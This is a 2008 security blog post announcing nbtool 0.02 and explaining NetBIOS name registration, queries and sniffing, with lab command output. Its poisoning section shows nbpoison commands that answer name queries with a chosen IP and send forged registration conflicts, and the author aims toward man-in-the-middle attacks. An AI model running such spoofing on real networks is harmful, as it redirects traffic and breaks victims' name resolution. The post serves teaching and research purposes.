---
id: 17
title: 'nbtool 0.02 released! (also, a primer on NetBIOS)'
date: '2008-08-26T10:03:38-05:00'
author: 'Ron Bowes'
layout: revision
guid: 'http://www.skullsecurity.org/blog/?p=17'
permalink: '/?p=17'
---

All right, maybe 0.02 doesn't sound so impressive, but I've put a lot of work into it so eh?

Anyway, I just finished putting together nbtool 0.02. It is partly a test program for myself, and partly a handy tool for probing NetBIOS networks. Here is a link to the tool itself (I've tested this on Linux, OS X (ppc + intel), iPhones, and Windows (cygwin)):  
<http://www.skullsecurity.org/wiki/index.php/Nbtool>

To actually understand what this tool is doing, I'm going to go over a high-level view of what the NetBIOS protocol is, and how it works, and how each of the four programs that come with nbtool 0.02 leverage it. If you want a more complete understanding, I highly recommend [Implementing CIFS](http://www.ubiqx.org/cifs/).

I highly recommend following along with the nbtool program. All you need is a network with a couple unfirewalled Windows systems. I suggest using VMWare.

## NetBIOS

At the simplest level, which is the level I've implemented in nbtool, NetBIOS is a way for multiple computers within a broadcast domain to find and talk to each other. They find each other based on names, and talk to each other with either UDP (datagram service) or TCP (session service) packets. That's it! There are also modes where NetBIOS queries can be routed, but I'm not going to get into that (I'm talking about 'b' or 'broadcast' mode, not 'p' or 'point-to-pont' mode).

### Registration

When you turn on a Windows system, it will 'register' its name by broadcasting a NetBIOS Registration packet. If somebody else is already using that name, they will reply with an error message ("Active"). This tells the new system that its name is in use, so it disables it. Occasionally, it will broadcast a NetBIOS Refresh, to ensure that everybody still knows it exists. Finally, when it's shut down, it will broadcast a NetBIOS Release packet. These packets all happen on UDP port 137, and are very easy to provoke (just reboot), so I won't post any packet captures. Just grab Wireshark and reboot a Windows box on the same network as yourself, and there you go.

On a sidenote, there are two types of names: unique and group. A unique name is typically the name of the computer itself, and nobody else can have it. For example, my test systems are named 'TEST1' and 'TEST2'. A group name can be shared by multiple machines, but nobody is allowed to grab it as a unique name. The default group name on Windows is 'WORKGROUP'.

This brings us to the <tt>nbregister</tt> program, which sends out any of those registration-related packets:

```
Usage: ./nbregister -t  -s  [-d ] -n [:] [-g] [-p listenport]
```

Here is an example of trying to register, refresh, and release a unique name that already exists:

```
$ ./nbregister -t register -n 'TEST1'
ANSWER name registration: (NB:TEST1    <00|workstation>): Status: error: active; IP: 192.168.1.41, TTL: 0s
$ ./nbregister -t refresh -n 'TEST1'
$ ./nbregister -t release -n 'TEST1'
```

Notice that the 'register' request provoked a response from 192.168.1.41, saying that the name is already active, as expected. There was no answer to the 'refresh' or 'release' queries, however.

We can use the '-g' flag to indicate that we're joining a group, as seen here:

```
$ ./nbregister -t register -n 'WORKGROUP' -g
```

Notice that no errors are returned -- the test boxes are fine with me joining their workgroup. However, if I try to take the name 'WORKGROUP' as a unique user, they get upset:

```
$ ./nbregister -t register -n 'WORKGROUP'
ANSWER name registration: (NB:WORKGROUP      <00|workstation>): Status: error: active; IP: 192.168.1.42, TTL: 0s
ANSWER name registration: (NB:WORKGROUP      <00|workstation>): Status: error: active; IP: 192.168.1.41, TTL: 0s
```

Both 192.168.1.41 and 192.168.1.42 are members of 'WORKGROUP', and they both send back an error when I attempt to take that as a name.

### Queries

So, now we see how systems register themselves on a network. But what happens when they want to find each other?

The answer to that is, they broadcast a request saying, "who is xxx?", and the system with that name, if it exists, responds saying, "that's me!". You can even be more general and say, "who is out there?", which every system is supposed to respond to. I wrote a little utility to do this called <tt>nbquery</tt>, although there are definitely other better ones out there.

Let's dive straight into examples. On the first one, we're going to ask, "who has TEST1" and "who has TEST2"?

```
$ ./nbquery -n 'TEST1'
ANSWER query: (NB:TEST1    <00|workstation>): Status: success; IP: 192.168.1.41, TTL: 300000s
$ ./nbquery -n 'TEST2'
ANSWER query: (NB:TEST2    <00|workstation>): Status: success; IP: 192.168.1.42, TTL: 300000s
```

The boxes both answer to their own name. If we want to find all the boxes on the network, we can specify a wildcard (or leave off the '-n' parameter all together):

```
$ ./nbquery -n '*'
ANSWER query: (NB:*<00|workstation>): Status: success; IP: 192.168.1.41, TTL: 300000s
ANSWER query: (NB:*<00|workstation>): Status: success; IP: 192.168.1.42, TTL: 300000s
```

They both answered that request. Now, if you want to dig deeper, you can ask a machine to provide information about itself (Microsoft's nbtstat program does this, as well as the opensource [nbtscan](http://www.inetcat.net/software/nbtscan.html)):

```
$ ./nbquery -n '*' -d '192.168.1.41' -t NBSTAT
NBSTAT response: recieved 8 names:
ANSWER query: (NBSTAT:*<00|workstation>): Status: success; TEST1    <00|workstation>
ANSWER query: (NBSTAT:*<00|workstation>): Status: success; TEST1    <20|server>
ANSWER query: (NBSTAT:*<00|workstation>): Status: success; WORKGROUP      <00|workstation>
ANSWER query: (NBSTAT:*<00|workstation>): Status: success; TEST1    <03|messenger>
ANSWER query: (NBSTAT:*<00|workstation>): Status: success; WORKGROUP      <1e|election>
ANSWER query: (NBSTAT:*<00|workstation>): Status: success; RON      <03|messenger>
ANSWER query: (NBSTAT:*<00|workstation>): Status: success; WORKGROUP      <1d|unknown>
ANSWER query: (NBSTAT:*<00|workstation>): Status: success; __MSBROWSE__<01|unknown>
 * Additional data: 00 0c 29 f9 d9 28 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                          00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

This returned all eight names owned by the box, including the computer's name ('TEST1'), the workgroup ('WORKGROUP'), the logged-in user ('RON'), and the special name whose meaning I don't understand yet ('x01x02\_\_MSBROWSER\_\_x02x01'). Additionally, it returned additional data. It's mostly 00s, but note the first 6 bytes -- Windows puts the box's MAC address there, while Samba leaves it blank.

### Sniffing

So, if you're still with me, it means I'm not as bad at explaining if I thought! Basically, that's the way NetBIOS registers and queries names. So, the first thing a hacker should think of is, what can I do with this?

Well, first off, the boring one: <tt>nbsniff</tt>. All this does is display the NetBIOS traffic it sees. Here is an example of it running while rebooting 'TEST2':

```
$ sudo ./nbsniff
QUESTION name release: (NB:TEST2           <20|server>)
ADDITIONAL name release: (NB:TEST2          <20|server>): IP: 192.168.1.42, TTL: 0s
QUESTION name release: (NB:TEST2          <03|messenger>)
ADDITIONAL name release: (NB:TEST2          <03|messenger>): IP: 192.168.1.42, TTL: 0s
QUESTION name release: (NB:WORKGROUP      <1e|election>)
ADDITIONAL name release: (NB:WORKGROUP      <1e|election>): IP: 192.168.1.42, TTL: 0s
QUESTION name release: (NB:WORKGROUP      <00|workstation>)
ADDITIONAL name release: (NB:WORKGROUP      <00|workstation>): IP: 192.168.1.42, TTL: 0s
QUESTION name release: (NB:TEST2          <00|workstation>)
ADDITIONAL name release: (NB:TEST2          <00|workstation>): IP: 192.168.1.42, TTL: 0s
QUESTION name registration: (NB:TEST2          <00|workstation>)
ADDITIONAL name registration: (NB:TEST2          <00|workstation>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:TEST2           <20|server>)
ADDITIONAL name registration: (NB:TEST2          <20|server>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:TEST2          <00|workstation>)
ADDITIONAL name registration: (NB:TEST2          <00|workstation>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:TEST2           <20|server>)
ADDITIONAL name registration: (NB:TEST2          <20|server>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:TEST2          <00|workstation>)
ADDITIONAL name registration: (NB:TEST2          <00|workstation>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:TEST2           <20|server>)
ADDITIONAL name registration: (NB:TEST2          <20|server>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:TEST2          <00|workstation>)
ADDITIONAL name registration: (NB:TEST2          <00|workstation>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:TEST2           <20|server>)
ADDITIONAL name registration: (NB:TEST2          <20|server>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:WORKGROUP      <00|workstation>)
ADDITIONAL name registration: (NB:WORKGROUP      <00|workstation>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:WORKGROUP      <00|workstation>)
ADDITIONAL name registration: (NB:WORKGROUP      <00|workstation>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:WORKGROUP      <00|workstation>)
ADDITIONAL name registration: (NB:WORKGROUP      <00|workstation>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:WORKGROUP      <00|workstation>)
ADDITIONAL name registration: (NB:WORKGROUP      <00|workstation>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:WORKGROUP      <1e|election>)
ADDITIONAL name registration: (NB:WORKGROUP      <1e|election>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:TEST2          <03|messenger>)
ADDITIONAL name registration: (NB:TEST2          <03|messenger>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:WORKGROUP      <1e|election>)
ADDITIONAL name registration: (NB:WORKGROUP      <1e|election>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:TEST2          <03|messenger>)
ADDITIONAL name registration: (NB:TEST2          <03|messenger>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:WORKGROUP      <1e|election>)
ADDITIONAL name registration: (NB:WORKGROUP      <1e|election>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:TEST2          <03|messenger>)
ADDITIONAL name registration: (NB:TEST2          <03|messenger>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:WORKGROUP      <1e|election>)
ADDITIONAL name registration: (NB:WORKGROUP      <1e|election>): IP: 192.168.1.42, TTL: 300000s
QUESTION name registration: (NB:TEST2          <03|messenger>)
ADDITIONAL name registration: (NB:TEST2          <03|messenger>): IP: 192.168.1.42, TTL: 300000s
```

Notice how it sends a bunch of 'release' broadcasts when it shuts down, then a bunch of 'register' broadcasts when it starts up, just as expected. Also note what a chatty protocol it is. All that traffic?

And here is a NetBIOS query from TEST1:

```
QUESTION query: (NB:DEMO           <00|workstation>)
QUESTION query: (NB:DEMO           <00|workstation>)
QUESTION query: (NB:DEMO           <00|workstation>)
```

Nice and simple!

But anyway, since we're seeing all the broadcasts, what's stopping us from answering them?

### Poisoning

And that brings me to the final tool in the nbtool packet: <tt>nbpoison</tt>. nbpoison will answer all NetBIOS queries with a chosen IP address. This includes:

- Computers on the LAN that aren't found
- Domains under 14 characters that can't be resolved by DNS (ie, mistyped URLs)
- Computers ont he LAN that ARE found, sometimes (it's a race, sometimes)

Here is an example of poisoning a local address:

```
$ sudo ./nbpoison -s 1.2.3.4
QUESTION query: (NB:DEMO           <00|workstation>)
(returning response with '1.2.3.4')
```

And here's the victim machine:

```
C:Documents and SettingsRon>ping DEMO

Pinging DEMO [1.2.3.4] with 32 bytes of data:

Request timed out.
Request timed out.
Request timed out.
Request timed out.

Ping statistics for 1.2.3.4:
    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum =  0ms, Average =  0ms
```

Notice that it resolved to my chosen IP!

Here's what the packet capture looks like:

```
192.168.1.41 -> 192.168.1.255	NBNS	Name query NB DEMO<00>
192.168.1.2 -> 192.168.1.41	NBNS	Name query response NB 1.2.3.4
```

Nothing complicated there -- It asks who has DEMO, and I respond saying, "1.2.3.4 does".

Where it gets a little more complicated is when you race another machine. Recall that my boxes are called TEST1 and TEST2. What happens when TEST2 tries to ping TEST1?

```
192.168.1.42 -> 192.168.1.255	NBNS	Name query NB TEST1<00>
192.168.1.41 -> 192.168.1.42	NBNS	Name query response NB 192.168.1.41
192.168.1.2 -> 192.168.1.42	NBNS	Name query response NB 1.2.3.4
```

In this case, TEST2 asks where to find TEST1, and gets two responses: one from TEST1, and one from me. Unfortunately, mine was second, so TEST2 gets the proper address and connects to the proper host.

Obviously, in an attack scenario, this isn't ideal. So, what can we do?

Recall a long time ago (at least, it feels like a long time ago when I'm typing...), I talked about sending a 'Conflict' packet to tell a system its name is already in use. So why don't we send a conflict ourselves?

To do this, we run nbpoison with the '-c' (or 'conflict') switch. This tells it to actively send out conflicts (I left it off by default because it can seriously break things). When that's enabled, it'll respond to every registration with a 'conflict'. Observe:

```
$ sudo ./nbpoison -s 1.2.3.4 -c
QUESTION name registration: (NB:TEST1    <00|workstation>)
(returning registration conflict)
ADDITIONAL name registration: (NB:TEST1    <00|workstation>): IP: 192.168.1.41, TTL: 300000s
QUESTION name registration: (NB:TEST1     <20|server>)
(returning registration conflict)
ADDITIONAL name registration: (NB:TEST1    <20|server>): IP: 192.168.1.41, TTL: 300000s
QUESTION name registration: (NB:TEST1    <03|messenger>)
(returning registration conflict)
ADDITIONAL name registration: (NB:TEST1    <03|messenger>): IP: 192.168.1.41, TTL: 300000s
```

And the first couple packets:

```
192.168.1.41 -> 192.168.1.255	NBNS	Registration NB TEST1<00>
192.168.1.2 -> 192.168.1.41	NBNS	Registration response, Name is owned by another node NB 1.2.3.4
192.168.1.41 -> 192.168.1.255	NBNS	Registration NB TEST1<20>
192.168.1.2 ->192.168.1.41	NBNS	Registration response, Name is owned by another node NB 1.2.3.4
...
```

As a result, if we ask TEST1 for its list of names, it won't have any:

```
$ sudo ./nbquery -d '192.168.1.41' -t NBSTAT
NBSTAT response: recieved 0 names:
(did you poison it with conflicts?)
 * Additional data: 00 0c 29 f9 d9 28 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                          00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

Now that TEST1 has been poisoned, TEST2 will always end up at our chosen server:

```
C:Documents and SettingsRon>ping TEST1

Pinging TEST1 [1.2.3.4] with 32 bytes of data:
...
```

### Conclusion

Hopefully you've taken away a little bit of information about how NetBIOS names work. My tools in their current state obviously don't do a whole lot, but I envision comining them to perform man-in-the-middle attacks against systems, but that'll be in the future. Stay tuned!

Ron